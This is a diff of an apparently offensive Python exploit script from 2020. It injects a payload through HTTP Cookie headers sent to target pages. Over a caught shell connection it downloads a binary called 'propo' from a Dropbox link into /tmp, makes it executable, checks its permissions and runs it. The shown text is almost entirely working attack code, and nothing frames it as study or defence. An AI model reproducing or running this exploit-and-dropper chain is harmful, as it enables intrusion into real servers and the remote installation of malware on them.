@@ -40,7 +40,7 @@ Marcus Agard, Robert Unnold 2020
 	sys.exit(0)
 
 def exploit(lhost,lport,rhost,rport,payload,pages):
-	headers = {"Cookie": payload, "Referer": payload}
+	headers = {"Cookie": payload,} #"Referer": payload}
 
 	for page in pages:
 		if stop:
@@ -110,13 +110,25 @@ while True:
 		clientsocket.settimeout(100)
 		# These links may change as we update the files
 		print("[-] Obtaining propo...")
-		clientsocket.sendall("wget -O /tmp/propo https://www.dropbox.com/s/094z3h3y3mlt1np/propo".encode())
+		clientsocket.sendall("curl http://www.dropbox.com/s/094z3h3y3mlt1np/propo --output /tmp/propo --silent\n".encode())
+		time.sleep(1)
+		# data = clientsocket.recv(buff)
+		# print(data.decode())
+		print("[-] Changing propo file mode...")
+		clientsocket.sendall("chmod +x /tmp/propo\n".encode())
+		time.sleep(1)
+		# data = clientsocket.recv(buff)
+		print("[-] Checking existence and executability of propo...")
+		clientsocket.sendall("ls /tmp -l | grep propo\n".encode())
 		time.sleep(1)
 		data = clientsocket.recv(buff)
 		print(data.decode())
-		time.sleep(1)
-		clientsocket.sendall("cd /tmp; ./propo".encode())
-		clientsocket.close()
+		if "-rwxr-xr-x" not in data.decode():
+			print("Catastrophic failure!!!!!")
+		else:
+			clientsocket.sendall("/tmp/propo\n".encode())
+			clientsocket.close()
+			sys.exit(0)
 		# while True:
 		# 	reply = input(f"{clientaddr[0]}> ")
 		# 	clientsocket.sendall(f"{reply}\n".encode())
